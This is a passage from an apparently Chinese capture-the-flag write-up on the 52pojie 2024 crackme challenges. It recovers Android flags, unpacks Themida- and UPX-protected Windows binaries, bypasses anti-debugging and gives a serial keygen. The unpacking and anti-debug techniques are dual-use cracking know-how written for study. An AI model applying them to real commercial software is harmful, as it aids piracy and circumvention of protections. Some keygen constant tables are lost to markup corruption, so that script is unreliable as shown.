struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;Q'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">8</span>])<br />    off += <span style="color: rgb(255, 115, 253);">8</span><br />    <span style="color: rgb(150, 203, 254);">assert</span> buf[off:off+<span style="color: rgb(255, 115, 253);">0x10</span>] == <span style="color: rgb(168, 255, 96);">b'APK Sig Block 42'</span>, <span style="color: rgb(168, 255, 96);">'sig block magic mismatch'</span><br />    off = offset - sig_block_size<br />    <span style="color: rgb(150, 203, 254);">assert</span> struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;Q'</span>, buf[off-<span style="color: rgb(255, 115, 253);">8</span>:off])[<span style="color: rgb(255, 115, 253);">0</span>] == sig_block_size, <span style="color: rgb(168, 255, 96);">'sig block size mismatch'</span><br />    first_cert = <span style="color: rgb(198, 197, 254);">None</span><br />    cert_cnt = <span style="color: rgb(255, 115, 253);">0</span><br />    <span style="color: rgb(150, 203, 254);">while</span> <span style="color: rgb(198, 197, 254);">True</span>:<br />        cur_size, id_value = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;QI'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">12</span>])<br />        <span style="color: rgb(150, 203, 254);">if</span> cur_size == sig_block_size:<br />            <span style="color: rgb(150, 203, 254);">break</span><br />        <span style="color: rgb(150, 203, 254);">if</span> verbose:<br />            print(<span style="color: rgb(168, 255, 96);">f'offset: 0x<span style="color: rgb(218, 239, 163);">{off:08x}</span>, size: 0x<span style="color: rgb(218, 239, 163);">{cur_size:08x}</span>, id: 0x<span style="color: rgb(218, 239, 163);">{id_value:08x}</span>'</span>)<br />        cur_off = off + <span style="color: rgb(255, 115, 253);">8</span><br />        off += <span style="color: rgb(255, 115, 253);">12</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (id_value ^ <span style="color: rgb(255, 115, 253);">0xdeadbeef</span>) == <span style="color: rgb(255, 115, 253);">0xafa439f5</span> <span style="color: rgb(150, 203, 254);">or</span> (id_value ^ <span style="color: rgb(255, 115, 253);">0xdeadbeef</span>) == <span style="color: rgb(255, 115, 253);">0x2efed62f</span>:<br />            off += <span style="color: rgb(255, 115, 253);">4</span> * <span style="color: rgb(255, 115, 253);">3</span> <span style="color: rgb(124, 124, 124);"># signer-sequence length, signer length, signed data length</span><br />            off += <span style="color: rgb(255, 115, 253);">4</span> + struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>])[<span style="color: rgb(255, 115, 253);">0</span>] <span style="color: rgb(124, 124, 124);"># digests-sequence length, digests-sequence</span><br />            off += <span style="color: rgb(255, 115, 253);">4</span> <span style="color: rgb(124, 124, 124);"># certificates length</span><br />            cert_size, = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>]) <span style="color: rgb(124, 124, 124);"># certificate length</span><br />            off += <span style="color: rgb(255, 115, 253);">4</span><br />            cert = buf[off:off+cert_size]<br />            base_hash = <span style="color: rgb(255, 115, 253);">1</span><br />            <span style="color: rgb(150, 203, 254);">for</span> i, v <span style="color: rgb(150, 203, 254);">in</span> enumerate(cert):<br />                base_hash = (base_hash * <span style="color: rgb(255, 115, 253);">31</span> + (v <span style="color: rgb(150, 203, 254);">if</span> v &lt; <span style="color: rgb(255, 115, 253);">0x80</span> <span style="color: rgb(150, 203, 254);">else</span> v - <span style="color: rgb(255, 115, 253);">256</span> + <span style="color: rgb(255, 115, 253);">2</span>**<span style="color: rgb(255, 115, 253);">32</span>)) &amp; <span style="color: rgb(255, 115, 253);">0xffffffff</span><br />            base_hash ^= <span style="color: rgb(255, 115, 253);">0x14131211</span><br />            <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(150, 203, 254);">not</span> verbose:<br />                <span style="color: rgb(150, 203, 254);">return</span> cert<br />            print(<span style="color: rgb(168, 255, 96);">f"    size: 0x<span style="color: rgb(218, 239, 163);">{cert_size:04x}</span>, hash: 0x<span style="color: rgb(218, 239, 163);">{base_hash:08x}</span>"</span>)<br />            <span style="color: rgb(150, 203, 254);">if</span> first_cert <span style="color: rgb(150, 203, 254);">is</span> <span style="color: rgb(198, 197, 254);">None</span>:<br />                first_cert = cert<br />        off = cur_off + cur_size<br />    <span style="color: rgb(150, 203, 254);">return</span> first_cert<br /><br />cert = get_v2_signature(<span style="color: rgb(168, 255, 96);">'【2024春节】解题领红包之Android初级题二.apk'</span>)<br />print(bytes([(a&amp;<span style="color: rgb(255, 115, 253);">0xff</span>)^b <span style="color: rgb(150, 203, 254);">for</span> a,b <span style="color: rgb(150, 203, 254);">in</span> zip([<span style="color: rgb(255, 115, 253);">86</span>, -<span style="color: rgb(255, 115, 253);">18</span>, <span style="color: rgb(255, 115, 253);">98</span>, <span style="color: rgb(255, 115, 253);">103</span>, <span style="color: rgb(255, 115, 253);">75</span>, -<span style="color: rgb(255, 115, 253);">73</span>, <span style="color: rgb(255, 115, 253);">51</span>, -<span style="color: rgb(255, 115, 253);">104</span>, <span style="color: rgb(255, 115, 253);">104</span>, <span style="color: rgb(255, 115, 253);">94</span>, <span style="color: rgb(255, 115, 253);">73</span>, <span style="color: rgb(255, 115, 253);">81</span>, <span style="color: rgb(255, 115, 253);">125</span>, <span style="color: rgb(255, 115, 253);">118</span>, <span style="color: rgb(255, 115, 253);">112</span>, <span style="color: rgb(255, 115, 253);">100</span>, -<span style="color: rgb(255, 115, 253);">29</span>, <span style="color: rgb(255, 115, 253);">63</span>, -<span style="color: rgb(255, 115, 253);">33</span>, -<span style="color: rgb(255, 115, 253);">110</span>, <span style="color: rgb(255, 115, 253);">108</span>, <span style="color: rgb(255, 115, 253);">115</span>, <span style="color: rgb(255, 115, 253);">51</span>, <span style="color: rgb(255, 115, 253);">59</span>, <span style="color: rgb(255, 115, 253);">55</span>, <span style="color: rgb(255, 115, 253);">52</span>, <span style="color: rgb(255, 115, 253);">77</span>], cert)]))</code></pre><p>得到flag为 <code style="font-family: SFMono-Regular, Consolas, ;">flag{52pj_HappyNewYear2024}</code>。</p><h2>Android 中级题</h2><p>jadx 打开，阅读 MainActivity 发现会加载 classes.dex 并调用 com.zj.wuaipojie2024_2.C 的 isValidate 方法验证输入。</p><p>而 isValidate 方法 则会调用 com.zj.wuaipojie2024_2.A 的 d 方法，注意拿到方法的过程中调用了 fix 修复 classes，使用的参数是 getResources().getIntArray(C0888R.array.A_offset)。</p><p>在 res/values/arrays.xml 里看到</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">&lt;?xml version=<span style="color: rgb(168, 255, 96);">"1.0"</span> encoding=<span style="color: rgb(168, 255, 96);">"utf-8"</span>?&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;resources&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;array name=<span style="color: rgb(168, 255, 96);">"A_offset"</span>&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>0<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>3<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>7908<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;/array&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;array name=<span style="color: rgb(168, 255, 96);">"D_offset"</span>&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>1<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>1<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />        <span style="color: rgb(150, 203, 254);">&lt;item&gt;</span>8108<span style="color: rgb(150, 203, 254);">&lt;/item&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;/array&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;/resources&gt;</span></code></pre><p>阅读 fix 代码可知三个参数分别是 class_def 编号、direct_methods 编号、encoded_method 的第 3 个 uleb128 参数即 code_off 要被修改为的值。</p><p>010 editor 打开 classes.dex 并应用模板，将相应 code_off 修改为 uleb128 编码的 7908（由于 hex(7908) == '0x1ee4' hex(0x1e&lt;&lt;1|1) == '0x3d'，所以是 E4 3D）。</p><p>修改后 jadx 打开 classes.dex，看到 d 函数开头调用 native 函数基于 socket connect 检查了 frida server 并验证包签名后对 str 做检查。</p><p>然后提示内容在 B.d 中，而 B.d 的内容显然是无意义的，因此猜测需要按 D_offset 的内容进行修复，而 D_offset 的 class_def 编号和 direct_methods 编号都对的上，因此用同样的方法打开 010 editor 对 code_off 进行 patch（由于 hex(8108) == '0x1fac' hex(0x1f&lt;&lt;1|1) == '0x3f'，所以是 AC 3F）。</p><p>发现内容为 <code style="font-family: SFMono-Regular, Consolas, ;">return "机缘是{" + Utils.md5(Utils.getSha1("password+你的uid".getBytes())) + "}";</code>。</p><p>猜测 password 为签名验证的 str。</p><p>据此抄写 jadx 输出编写程序即可</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> java.math.BigInteger;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.MessageDigest;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.NoSuchAlgorithmException;<br /><br /><span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">Main</span> {<br />        <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">byte</span>[] getSha1(<span style="color: rgb(255, 255, 182);">byte</span>[] bArr) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"SHA"</span>).digest(bArr);<br />        } <span style="color: rgb(150, 203, 254);">catch</span> (Exception unused) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">md5</span>(<span style="color: rgb(255, 255, 182);">byte</span>[] bArr) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">bigInteger</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">BigInteger</span>(<span style="color: rgb(255, 115, 253);">1</span>, MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"md5"</span>).digest(bArr)).toString(<span style="color: rgb(255, 115, 253);">16</span>);<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">32</span> - bigInteger.length(); i++) {<br />                bigInteger = <span style="color: rgb(168, 255, 96);">"0"</span> + bigInteger;<br />            }<br />            <span style="color: rgb(150, 203, 254);">return</span> bigInteger;<br />        } <span style="color: rgb(150, 203, 254);">catch</span> (NoSuchAlgorithmException unused) {<br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"ops!!"</span>);<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">main</span>(String[] args) {<br />        <span style="color: rgb(255, 255, 182);">StringBuffer</span> <span style="color: rgb(198, 197, 254);">stringBuffer</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuffer</span>();<br />        <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">0</span>;<br />        <span style="color: rgb(150, 203, 254);">while</span> (stringBuffer.length() &lt; <span style="color: rgb(255, 115, 253);">9</span> &amp;&amp; i &lt; <span style="color: rgb(255, 115, 253);">40</span>) {<br />            <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i2</span> = i + <span style="color: rgb(255, 115, 253);">1</span>;<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">substring</span> = <span style="color: rgb(168, 255, 96);">"0485312670fb07047ebd2f19b91e1c5f"</span>.substring(i, i2);<br />            <span style="color: rgb(150, 203, 254);">if</span> (!stringBuffer.toString().contains(substring)) {<br />                stringBuffer.append(substring);<br />            }<br />            i = i2;<br />        }<br />        <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">password</span> = stringBuffer.toString().toUpperCase();<br />        System.out.println(password);<br />        System.out.println(md5(getSha1((password + <span style="color: rgb(168, 255, 96);">"691872"</span>).getBytes())));<br />    }<br />}</code></pre><p>password 为 048531267</p><p>最后这一部分 flag 是否有 {} 等细节多少有点迷，不过问题不大。</p><h2>Windows 高级题</h2><p>客户端类 UPX 壳，没法用 UPX 自动脱壳，因此用“ESP 定律”脱，脱下来随便修复下（不用能跑，ida里能看即可）。</p><p>服务端 Themida 强壳，但 unlicense 非常nb，按提示在 conda 里装个 python 3.10 32-bit：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">conda create -n py310_32<br />conda activate py310_32<br />conda config --env --set subdir win-32<br />conda install python=3.10<br />conda activate py310_32</code></pre><p>然后用这个工具就可以完美脱壳，并能正确运行。</p><p>然后有一些反调试，但是 x64dbg 下用 ScyllaHide Themida Profile 基本都能自动过掉，无须操心。</p><p>IDA 里阅读客户端代码可知调用的是 out-of-process 的、 .exe 的 COM 接口。服务端注册后，客户端获得 COM 对象时 Windows 就会自动启动服务端，随后通过RPC受理调用请求。</p><p>在 Windows SDK 里找到 oleview 工具(我的电脑上在 C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x86\oleview.exe)，File 菜单下选 View Typelib，选择服务端程序，可以得到 RPC 接口的 IDL：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// Generated .IDL file (by the OLE/COM Object Viewer)</span><br /><span style="color: rgb(124, 124, 124);">// </span><br /><span style="color: rgb(124, 124, 124);">// typelib filename: crackme2024service.exe</span><br /><br />[<br />  <span style="color: rgb(255, 255, 182);">uuid</span>(E5F1A4DB-E66F-<span style="color: rgb(255, 115, 253);">4</span>F2E-B98D-<span style="color: rgb(255, 115, 253);">7E6</span>E33D6C9A6),<br />  <span style="color: rgb(255, 255, 182);">version</span>(<span style="color: rgb(255, 115, 253);">1.0</span>),<br />  <span style="color: rgb(255, 255, 182);">custom</span>(DE77BA64-<span style="color: rgb(255, 115, 253);">517</span>C-<span style="color: rgb(255, 115, 253);">11</span>D1-A2DA-<span style="color: rgb(255, 115, 253);">0000</span>F8773CE9, <span style="color: rgb(255, 115, 253);">134218331</span>),<br />  <span style="color: rgb(255, 255, 182);">custom</span>(DE77BA63-<span style="color: rgb(255, 115, 253);">517</span>C-<span style="color: rgb(255, 115, 253);">11</span>D1-A2DA-<span style="color: rgb(255, 115, 253);">0000</span>F8773CE9, <span style="color: rgb(255, 115, 253);">1707276290</span>),<br />  <span style="color: rgb(255, 255, 182);">custom</span>(DE77BA65-<span style="color: rgb(255, 115, 253);">517</span>C-<span style="color: rgb(255, 115, 253);">11</span>D1-A2DA-<span style="color: rgb(255, 115, 253);">0000</span>F8773CE9, <span style="color: rgb(168, 255, 96);">"Created by MIDL version 8.00.0603 at Wed Feb 07 11:24:49 2024<br />"</span>)<br /><br />]<br />library crackme2024serviceLib<br />{<br />    <span style="color: rgb(124, 124, 124);">// TLib : OLE Automation : {00020430-0000-0000-C000-000000000046}</span><br />    <span style="color: rgb(255, 255, 182);">importlib</span>(<span style="color: rgb(168, 255, 96);">"stdole2.tlb"</span>);<br /><br />    <span style="color: rgb(124, 124, 124);">// Forward declare all types defined in this typelib</span><br />    interface IATLCrackmeObject;<br /><br />    [<br />      <span style="color: rgb(255, 255, 182);">uuid</span>(E31B66BC-<span style="color: rgb(255, 115, 253);">893</span>B-<span style="color: rgb(255, 115, 253);">4269</span>-<span style="color: rgb(255, 115, 253);">8</span>C01-<span style="color: rgb(255, 115, 253);">14</span>F95AF8CDCD)<br />    ]<br />    coclass ATLCrackmeObject {<br />        [default] interface IATLCrackmeObject;<br />    };<br /><br />    [<br />      odl,<br />      <span style="color: rgb(255, 255, 182);">uuid</span>(<span style="color: rgb(255, 115, 253);">384</span>C7517-B706-<span style="color: rgb(255, 115, 253);">4958</span>-AB87-<span style="color: rgb(255, 115, 253);">6</span>EE5925674B2),<br />      dual,<br />      nonextensible,<br />      oleautomation<br />    ]<br />    interface IATLCrackmeObject : IDispatch {<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000001</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method1()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">setUID</span>([<span style="color: rgb(150, 203, 254);">in</span>] unsigned int id);<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000002</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method2()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">setSerial</span>([<span style="color: rgb(150, 203, 254);">in</span>] unsigned <span style="color: rgb(255, 255, 182);">char</span> serial[<span style="color: rgb(255, 115, 253);">200</span>]);<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000003</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method3()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">checkSerial</span>([out, retval] <span style="color: rgb(255, 255, 182);">char</span>* result);<br />        [<span style="color: rgb(255, 255, 182);">id</span>(<span style="color: rgb(255, 115, 253);">0x00000004</span>), <span style="color: rgb(255, 255, 182);">helpstring</span>(<span style="color: rgb(168, 255, 96);">"method: Method4()"</span>)]<br />        HRESULT <span style="color: rgb(255, 255, 182);">setCallback</span>([<span style="color: rgb(150, 203, 254);">in</span>] uint64 funPtr);<br />    };<br />};</code></pre><p>然后就是想个办法定位到服务端这些函数的位置，我找了半天找不到（事后反过来找发现可以从 <code style="font-family: SFMono-Regular, Consolas, ;">ATL::CComObject&lt;class CATLCrackmeObject&gt;</code>或<code style="font-family: SFMono-Regular, Consolas, ;">ATL::CComContainedObject&lt;class CATLCrackmeObject&gt;</code>的 vftable 入手(根据网上的例子可知，实际用户编写的类是个抽象类，其 vtable 并不实际生成(ATL_NO_VTABLE)，需要找到它的子类才有这些虚函数指针)）。</p><p>注意到客户端有一些共享内存的逻辑，猜测服务端也有，因此从相关函数的导入表开始查询交叉引用定位到了<code style="font-family: SFMono-Regular, Consolas, ;">ATL::CComObject&lt;class CATLCrackmeObject&gt;</code>的构造函数。</p><p>然后就是阅读整体逻辑：依次为 setUID、客户端跑共享内存中的代码、setSerial、checkSerial。</p><p>把 CATLCrackmeObject 类在 IDA 里定义出相应的结构体来，然后根据这些服务端函数依次还原每个字段的含义就差不多能看懂 checkSerial 的内容了。</p><p>最后 dump 出一些常量来就可以写还原 serial 的脚本了：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);"># note: unlicense require 32-bit python if you need unpack 32bit executable</span><br /><span style="color: rgb(124, 124, 124);"># using conda activate py310_32</span><br /><span style="color: rgb(124, 124, 124);"># or</span><br /><span style="color: rgb(168, 255, 96);">"""<br />conda create -n py310_32<br />conda activate py310_32<br />conda config --env --set subdir win-32<br />conda install python=3.10<br />"""</span><br /><span style="color: rgb(124, 124, 124);"># first use ole viewer at C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x86\oleview.exe</span><br /><span style="color: rgb(124, 124, 124);"># File-&gt;View Typelib to read idl</span><br /><span style="color: rgb(124, 124, 124);"># find vtable for ATL::CComContainedObject&lt;class CATLCrackmeObject&gt;::`vftable'</span><br /><span style="color: rgb(124, 124, 124);"># or ATL::CComObject&lt;class CATLCrackmeObject&gt;::`vftable'</span><br /><span style="color: rgb(124, 124, 124);"># its own constructor will be ATL_NO_VTABLE</span><br /><span style="color: rgb(124, 124, 124);"># so search constructor for ATL::CComAggObject&lt;CATLCrackmeObject&gt; or ATL::CComObject&lt;class CATLCrackmeObject&gt;</span><br /><span style="color: rgb(124, 124, 124);">#691872</span><br /><span style="color: rgb(124, 124, 124);">#6F73F5E400</span><br /><span style="color: rgb(124, 124, 124);"># 36A8ADECAA4AEF73</span><br /><span style="color: rgb(124, 124, 124);">#12345678901234567890123456789012354</span><br /><span style="color: rgb(124, 124, 124);">#12131410-22232412-22232122-22232122</span><br /><span style="color: rgb(150, 203, 254);">from</span> struct <span style="color: rgb(150, 203, 254);">import</span> *<br />dword_41F8D4, =unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, bytes.fromhex(<span style="color: rgb(168, 255, 96);">'20C8555E'</span>))<br />dword_41F8D0, =unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, bytes.fromhex(<span style="color: rgb(168, 255, 96);">'D8AD2652'</span>))<br />cc = list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;16I'</span>, bytes.fromhex(<span style="color: rgb(168, 255, 96);">'519E0AA3C206BB229417265A7393710C7813B847446653FEBCCB59467D55A4EB412FD560C4B26B3D1BF0159DB49E0D16BF07CAEC94CFD036379638AE9BB168F8'</span>)))<br /><br />dword_41F4D0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br />dword_41F0D0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br />dword_41E8D0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br />dword_41ECD0=list(unpack(<span style="color: rgb(168, 255, 96);">'&lt;256I'</span>, bytes.fromhex(<span style="color: rgbspan>)))<br /><br /><span style="color: rgb(124, 124, 124);"># enc test</span><br /><span style="color: rgb(168, 255, 96);">"""<br />ori = bytes.fromhex('65f046ce94b5437a1e873878258d6781')<br />ans = b''<br />for t in range(0, 16, 8):<br />    v5, v7 = unpack('&lt;II', ori[t:t+8])<br />    for v8 in cc[::-1]:<br />        v9 = v5 ^ v8<br />        v5 = v7 ^ ((dword_41F4D0[(v9 &gt;&gt; 24) &amp; 0xff] + (dword_41F0D0[(v9 &gt;&gt; 16) &amp; 0xff] ^ ((dword_41E8D0[v9 &amp; 0xff] + dword_41ECD0[(v9 &gt;&gt; 8) &amp; 0xff]) &amp; 0xffffffff))) &amp; 0xffffffff)<br />        v7 = v9<br />    v10 = v5 ^ dword_41F8D4<br />    v11 = v9 ^ dword_41F8D0<br />    ans += pack('&lt;II', v11, v10)<br /><br />print(ans)<br />"""</span><br /><br />uid = int(input(<span style="color: rgb(168, 255, 96);">'uid: '</span>))<br />shared = uid<br /><span style="color: rgb(124, 124, 124);"># this logic also have anti-debug which can be bypass</span><br />shared = (shared * shared) &amp; <span style="color: rgb(255, 115, 253);">0xffffffffffffffff</span><br />shared = (shared * uid) &amp; <span style="color: rgb(255, 115, 253);">0xffffffffffffffff</span><br />shared ^= <span style="color: rgb(255, 115, 253);">0x323032796C6C6F73</span><br />ans = hex(shared)[<span style="color: rgb(255, 115, 253);">2</span>:].zfill(<span style="color: rgb(255, 115, 253);">16</span>).upper().encode()<br />print(<span style="color: rgb(168, 255, 96);">'shared:'</span>, hex(shared))<br />ans = ans.ljust(<span style="color: rgb(255, 115, 253);">16</span>, <span style="color: rgb(168, 255, 96);">b'\x00'</span>)<br />ori = <span style="color: rgb(168, 255, 96);">b''</span><br /><span style="color: rgb(150, 203, 254);">for</span> t <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">16</span>, <span style="color: rgb(255, 115, 253);">8</span>):<br />    v11, v10 = unpack(<span style="color: rgb(168, 255, 96);">'&lt;II'</span>, ans[t:t+<span style="color: rgb(255, 115, 253);">8</span>])<br />    v5 = v10 ^ dword_41F8D4<br />    v9 = v11 ^ dword_41F8D0<br />    <span style="color: rgb(150, 203, 254);">for</span> v8 <span style="color: rgb(150, 203, 254);">in</span> cc:<br />        v7 = v5 ^ ((dword_41F4D0[(v9 &gt;&gt; <span style="color: rgb(255, 115, 253);">24</span>) &amp; <span style="color: rgb(255, 115, 253);">0xff</span>] + (dword_41F0D0[(v9 &gt;&gt; <span style="color: rgb(255, 115, 253);">16</span>) &amp; <span style="color: rgb(255, 115, 253);">0xff</span>] ^ ((dword_41E8D0[v9 &amp; <span style="color: rgb(255, 115, 253);">0xff</span>] + dword_41ECD0[(v9 &gt;&gt; <span style="color: rgb(255, 115, 253);">8</span>) &amp; <span style="color: rgb(255, 115, 253);">0xff</span>]) &amp; <span style="color: rgb(255, 115, 253);">0xffffffff</span>))) &amp; <span style="color: rgb(255, 115, 253);">0xffffffff</span>)<br />        v5 = v9 ^ v8<br />        v9 = v7<br />    ori += pack(<span style="color: rgb(168, 255, 96);">'&lt;II'</span>, v5, v7)<br /><br />print(<span style="color: rgb(168, 255, 96);">'serial:'</span>, <span style="color: rgb(168, 255, 96);">'-'</span>.join(hex(v)[<span style="color: rgb(255, 115, 253);">2</span>:].zfill(<span style="color: rgb(255, 115, 253);">8</span>) <span style="color: rgb(150, 203, 254);">for</span> v <span style="color: rgb(150, 203, 254);">in</span> unpack(<span style="color: rgb(168, 255, 96);">'&lt;4I'</span>, ori)))</code></pre><h2>Android 高级题</h2><p>jadx打开看到的逻辑为：传入补充前导0到8个字节的uid字符串的md5和一个不小于100字节的字符串到native函数checkSn，返回true即为成功。</p><p>因为感觉和去年的 Android 高级题差不多，所以看了下去年的题解，发现主要思路就是调用JNI_OnLoad得知校验函数地址后unidbg运行它，然后多打日志慢慢看。</p><p>打开unidbg发现里面还有没做完的去年的Android高级题，于是决定今年的这题得把它做出来QAQ。</p><p>去年的题解似乎更多是进行数据流分析+猜测，但个人更喜欢分析清楚控制流。</p><h3>去混淆</h3><h4>概览</h4><p>这题应用了朴素的 ollvm（控制流扁平化+虚假控制流）+间接调用/间接条件跳转（值得注意的是一些用于计算实际跳转地址的常量还可能会通过函数的第一个参数传递下去，下面我在这些函数的名字上标上 Internal）+字符串加密。</p><p>分析 ollvm 只要找到主分发器（或预处理器，即真实块的后继）的位置并在 unidbg 里打断点、执行到这里时打出当前状态变量（即分发器选择作为跳转目标的真实块所依据的寄存器）的值，基本就能手动连起来看了（因为这里到达真实块前的最后一次条件跳转几乎总是 状态变量!=进入主分发器时状态变量的值）。</p><p>而虚假控制流可以用新版 IDA 内置的 gooMBA（也可以将其移植到 旧版 IDA 上）去除。也可以用 D-810 去除，但比较慢。</p><p>间接调用/间接条件跳转则把 IDA/hexrays 干懵了（以下内容找个 view microcode 的插件观察即可得知）：</p><ol><li style="margin-left: 2px;"><p>因为 